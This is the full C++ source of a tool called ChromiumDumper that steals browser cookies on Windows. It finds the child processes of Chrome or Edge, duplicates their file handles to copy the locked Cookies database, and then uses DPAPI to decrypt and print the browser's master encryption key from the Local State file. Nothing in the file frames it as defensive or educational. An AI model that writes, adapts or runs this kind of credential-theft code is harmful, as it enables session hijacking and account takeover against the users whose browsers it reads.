#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include <shlwapi.h>
#include <list>
#include "ChromiumDumper.h"

#define SystemHandleInformation 0x10
#define SystemHandleInformationSize 2048 * 2048 * 2

int pCount = 0;
int fCount = 0;

std::list<DWORD> parents;
std::list<DWORD> processes;
std::list<HANDLE> pHandles;
std::list<HANDLE> fHandles;

using namespace std;


BOOL FindProcess(WCHAR* procname){
    ULONG returnLength = 0;
    PSYSTEM_PROCESSES pProcInfo = NULL;
    LPVOID pProcInfoBuffer = NULL;
    SIZE_T procInfoSize = 0x10000;
    NTSTATUS status;
    UNICODE_STRING uProcName;

    

    NTQUERYSYSTEMINFORMATION NtQuerySystemInformation = (NTQUERYSYSTEMINFORMATION)GetProcAddress(GetModuleHandle("ntdll"), "NtQuerySystemInformation");
    ZWFREEVIRTUALMEMORY ZwFreeVirtualMemory = (ZWFREEVIRTUALMEMORY)GetProcAddress(GetModuleHandle("ntdll"), "ZwFreeVirtualMemory");
    RTLEQUALUNICODESTRING RtlEqualUnicodeString = (RTLEQUALUNICODESTRING)GetProcAddress(GetModuleHandle("ntdll"), "RtlEqualUnicodeString");
    RTLINITUNICODESTRING RtlInitUnicodeString = (RTLINITUNICODESTRING)GetProcAddress(GetModuleHandle("ntdll"), "RtlInitUnicodeString");
    ZWALLOCATEVIRTUALMEMORY ZwAllocateVirtualMemory = (ZWALLOCATEVIRTUALMEMORY)GetProcAddress(GetModuleHandle("ntdll"), "ZwAllocateVirtualMemory");
    
    do {
		pProcInfoBuffer  = NULL;
        status = ZwAllocateVirtualMemory((HANDLE)-1, &pProcInfoBuffer, 0, &procInfoSize, MEM_COMMIT, PAGE_READWRITE);
        if (status != 0) {
            printf("[ChromiumDumper] Something went wrong: 0x%x\n", status);
			return 0;
		}
		status = NtQuerySystemInformation(SystemProcessInformation, pProcInfoBuffer, procInfoSize, &returnLength);
    
		if(status == 0xC0000004) {
			ZwFreeVirtualMemory((HANDLE)-1, &pProcInfoBuffer, &procInfoSize, MEM_RELEASE);
			procInfoSize += returnLength;
		}

	} while (status != 0);

    RtlInitUnicodeString(&uProcName, procname);
   
    pProcInfo = (PSYSTEM_PROCESSES)pProcInfoBuffer;
    do {
		pProcInfo = (PSYSTEM_PROCESSES)(((LPBYTE)pProcInfo) + pProcInfo->NextEntryDelta);

		if (RtlEqualUnicodeString(&pProcInfo->ProcessName, &uProcName, TRUE)) {
			processes.push_back((DWORD)(DWORD_PTR)pProcInfo->ProcessId);
            parents.push_back((DWORD)(DWORD_PTR)pProcInfo->InheritedFromProcessId);
		}
		if (pProcInfo->NextEntryDelta == 0) {
			break;
		}

	} while (pProcInfo && pProcInfo->NextEntryDelta);

    if(processes.empty()){
        printf("[ChromiumDumper] Chrome is not running\n");
        return 0;
    } 
    parents.sort();
    parents.unique();

    int size = parents.size();
    for(int i=0; i<size; i++){      
        bool found = (std::find(processes.begin(), processes.end(), parents.front()) != processes.end());
        if(found)
            processes.remove(parents.front());
        parents.remove(parents.front());
    }
    size = processes.size();
 
    list<DWORD>::iterator it = processes.begin(); 
    printf("[ChromiumDumper] Found child %ws PID(s): [", procname);
    for(int i=0; i<size; i++){

        if(processes.size()-i != 1)
            printf("%i, ", *it);
        else
            printf("%i].\n", *it);
        advance(it, 1);      
    }

    return 1;
}



BOOL FindCookieHandle(char * hFileOut){
    NTSTATUS status;
    HANDLE hProcess;
    HANDLE hFile;

    
    ULONG returnLength = 0;
    HANDLE hFileWrite = NULL;
    hFileWrite = CreateFileA(hFileOut, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hFileWrite == INVALID_HANDLE_VALUE){
        printf("[ChromiumDumper] Failed to create the file: 0x%x\n", GetLastError());
        return 0;
    }

    NTQUERYSYSTEMINFORMATION NtQuerySystemInformation = (NTQUERYSYSTEMINFORMATION)GetProcAddress(GetModuleHandle("ntdll"), "NtQuerySystemInformation");
    PSYSTEM_HANDLE_INFORMATION pHandleInfoBuffer = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, SystemHandleInformationSize);
    status = NtQuerySystemInformation(SystemHandleInformation , pHandleInfoBuffer, SystemHandleInformationSize, &returnLength);
    if(status){
        printf("[ChromiumDumper] Failed to query system information: %x\n", status);
        return 0;
    }
    
    
    for (int i = 0; i < pHandleInfoBuffer->NumberOfHandles; i++)
    {
        if(processes.size()==0)
            break;
        BOOL present = FALSE;
        BOOL open = FALSE;
        TCHAR path[MAX_PATH];
        SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (SYSTEM_HANDLE_TABLE_ENTRY_INFO)pHandleInfoBuffer->Handles[i];
        if(handleInfo.GrantedAccess != 0x12019f)
            continue;
        if(std::find(processes.begin(), processes.end(), handleInfo.UniqueProcessId) != processes.end()){
            
            hProcess = OpenProcess(PROCESS_DUP_HANDLE, FALSE, handleInfo.UniqueProcessId);
            if(!hProcess){
                printf("[ChromiumDumper] Failed to open process %i: %x\n", handleInfo.UniqueProcessId, GetLastError());
                continue;
            } else{
                processes.remove(handleInfo.UniqueProcessId);
            }
            pHandles.push_front(hProcess);
        } 
        
        
        if(!DuplicateHandle(hProcess, (HANDLE)handleInfo.HandleValue, (HANDLE)-1, &hFile, NULL, FALSE, DUPLICATE_SAME_ACCESS))
                continue;
        fHandles.push_front(hFile);
        if(GetFileType(hFile) != 1)
            continue;
        
        DWORD nameSize = sizeof(FILE_NAME_INFO) + (sizeof(WCHAR) * MAX_PATH);
        PFILE_NAME_INFO fInfo = (PFILE_NAME_INFO)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,nameSize);
        DWORD fileNameInfoSize;
        char pt[MAX_PATH];
        if(GetFileInformationByHandleEx(hFile, FileNameInfo, fInfo, nameSize))
            wcstombs(pt, fInfo->FileName, fInfo->FileNameLength); 
        else
            printf("[ChromiumDumper] Error %x\n", GetLastError());
        
        char* p = strtok(pt, "\\"); 
        while (p != NULL) {
            
            if(!strcmp(p, "Cookies"))
                {
                    printf_s("[ChromiumDumper] Found handle 0x%x at 0x%p:\n[ChromiumDumper]    - PID: %i\n[ChromiumDumper]    - FileName: %s\n[ChromiumDumper]    - Type %x\n", handleInfo.HandleValue, handleInfo.Object, handleInfo.UniqueProcessId, p, handleInfo.ObjectTypeIndex);
            
                    char file_read[4096];
                    DWORD dwRead;
                    DWORD dwWritten;
                    DWORD totalBytesRead=0;
                    
                    // Retrieve current file pointer
                    DWORD dwPtr = SetFilePointer(hFile, 0, NULL, FILE_CURRENT);
                    // Set file pointer to the beginning of the file
                    SetFilePointer(hFile, NULL, NULL, 0);
                    
                    
                    while(ReadFile(hFile, &file_read, sizeof(file_read), &dwRead, NULL) && dwRead) {
                        WriteFile(hFileWrite, file_read, dwRead, &dwWritten, NULL);
                        totalBytesRead += dwRead;  
                    }
                    printf("[ChromiumDumper] Finished. Bytes copied: %i\n", totalBytesRead);
                    // reset file pointer to make file available for reading again
                    SetFilePointer(hFile, dwPtr, NULL, 0);
                    CloseHandle(hFileWrite);
                    free(fInfo);
                    return 1;
                } 
            
                p = strtok(NULL, "\\");
            
        }
    
      
    }
    return 0;
}

void GetStateKey(char *path){

    
    WCHAR szFilePath[MAX_PATH];
    
    const size_t size = strlen(path) + 1;
    mbstowcs(szFilePath, path, size);
    HANDLE hFile = CreateFileW(szFilePath, FILE_READ_ACCESS, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[ChromiumDumper] CreateFileW failed lasterror=%08x\n", GetLastError());
        return;
    }

    DWORD dwReaded;
    char file_read[2048];
    bool key_found = false;
    char encKey[1024];
    encKey[0] = '\0';
    int prepos = 0;

    while(ReadFile(hFile, &file_read, sizeof(file_read), &dwReaded, NULL) && dwReaded) {
        
        for (int i = 0; i < sizeof(file_read); i++)
        {
            if ((file_read[i-6] == 107) && (file_read[i - 5] == 101) && (file_read[i - 4] == 121) && (file_read[i - 3] == 34) && (file_read[i - 2] == 58) && (file_read[i - 1] == 34)) { // key":"
                printf("[ChromiumDumper] Found EncryptedKey at position: %i\n", prepos + i + 1);
                
                for (int j = i; j < sizeof(file_read); j++) {
                    if (file_read[j] == 34) {
                        printf("[ChromiumDumper] EncryptedKey total length [1]: %i\n", j - i);
                        strncpy(encKey, &file_read[i], j - i);
                        encKey[j - i] = '\0';
                        key_found = true;
                        break;
                    }
                }
                
                
                if (!key_found) {
                    prepos = sizeof(file_read) - i;
                    
                    strncpy(encKey, &file_read[i], prepos);
                    
                    ReadFile(hFile, &file_read, sizeof(file_read), &dwReaded, NULL);
                 
                    for (int k = 0; k < sizeof(file_read); k++) {
                        if (file_read[k] == 34) {
                            printf("[ChromiumDumper] EncryptedKey total length [2]: %i\n", prepos + k);
                            strncpy(encKey + prepos, &file_read[0], k);
                            encKey[prepos + k] = '\0';
                            key_found = true;
                            break;
                        }
                    }
                }
                break;
            }   
        }
        if (key_found) {
            break;
        }
        prepos += dwReaded;
    }

    CloseHandle(hFile);

    if (encKey[0] == '\0') {
        printf("[ChromiumDumper] EncryptedKey not found\n");
        return;
    }

    DWORD bufLen = 0;
    
    if(!CryptStringToBinaryA(encKey, 0, CRYPT_STRING_BASE64, NULL, &bufLen, NULL, NULL))
    {
        printf("[ChromiumDumper] Something went wrong: 0x%x", GetLastError());
        return;
    }
    BYTE* decBuf1 = (BYTE*)malloc(bufLen);
    if(!CryptStringToBinaryA(encKey, 0, CRYPT_STRING_BASE64, decBuf1, &bufLen, NULL, NULL))
    {   
        printf("[ChromiumDumper] Something went wrong: 0x%x", GetLastError());
        return;
    }
    BYTE* decBuf2 = &decBuf1[5];
    
    DATA_BLOB DataIn;
    DataIn.cbData = bufLen - 5;
    DataIn.pbData = (PBYTE)decBuf2;

    DATA_BLOB DataOut;
    DataOut.cbData = 0;
    DataOut.pbData = NULL;
    
    if (CryptUnprotectData(&DataIn, NULL, NULL, NULL, NULL, 0, &DataOut)) {
      
        DWORD deckeyLen = 0;
        if(!CryptBinaryToStringA(DataOut.pbData, DataOut.cbData, CRYPT_STRING_BASE64, NULL, &deckeyLen))
        {
            printf("[ChromiumDumper] Something went wrong: 0x%x", GetLastError());
            return;
        }
        char* decKey = (char*)malloc(deckeyLen);
        if(!CryptBinaryToStringA(DataOut.pbData, DataOut.cbData, CRYPT_STRING_BASE64, decKey, &deckeyLen))
        {
            printf("[ChromiumDumper] Something went wrong: 0x%x", GetLastError());
            return;
        }
        printf("[ChromiumDumper] Masterkey: %s\n", decKey);
        free(decKey);
        
    }
    

    free(decBuf1);
    LocalFree(DataOut.pbData);
}


int main(int argc, char *argv[])
{   
    char* path;
    char* hFileOut = "Cookies";

    if(argc <2){
        printf("Too few arguments provided.\nUsage:\n       ChromiumDumper.exe <chrome|edge> [Output File]\n");
        return 0;
    }
    
     
    if(!strcmp(argv[1], "edge")){
        if(!FindProcess(L"msedge.exe")){
            printf("[ChromiumDumper] Something went wrong: %i\n", GetLastError());
            return 0;
        }
        path = strcat(getenv("localappdata"),"\\Microsoft\\Edge\\User Data\\Local State");
        }
    if(!strcmp(argv[1], "chrome")){
        if(!FindProcess(L"chrome.exe")){
        printf("[ChromiumDumper] Something went wrong: %i\n", GetLastError());
            return 0;
        }
        path = strcat(getenv("localappdata"),"\\Google\\Chrome\\User Data\\Local State");
        }

    if(argc ==3)
        hFileOut = argv[2];

    if(FindCookieHandle(hFileOut)){
        int size = pHandles.size();
        for(int i=0; i<size; i++){
            CloseHandle(pHandles.front());
            pHandles.pop_front();
        }
        size = fHandles.size();
        for(int i=0; i<size; i++){
            CloseHandle(fHandles.front());
            fHandles.pop_front();
        }
        GetStateKey(path);
        }
    else
        ("[ChromiumDumper] Something went wrong: %i", GetLastError());

    



    return 1;
}